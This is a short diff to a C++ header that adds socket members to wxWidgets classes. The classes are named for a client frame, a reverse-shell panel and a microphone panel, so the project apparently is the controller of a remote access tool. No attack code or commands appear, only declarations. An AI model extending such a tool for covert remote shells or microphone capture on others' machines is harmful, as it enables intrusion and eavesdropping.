@@ -19,9 +19,9 @@ private:
 class FrameCliente : public wxFrame {
     public:
         std::string strClienteID = "";
-        
+        SOCKET sckCliente = INVALID_SOCKET;
 
-        FrameCliente(std::string pstrID, wxString nameID);
+        FrameCliente(std::string pstrID, SOCKET sckID);
 
         MyTreeCtrl* m_tree;
 
@@ -72,6 +72,7 @@ class panelReverseShell : public wxPanel {
         int iHistorialPos = 0;
 
         std::string strID = "";
+        SOCKET sckCliente = INVALID_SOCKET;
 };
 
 class panelMicrophone : public wxPanel {
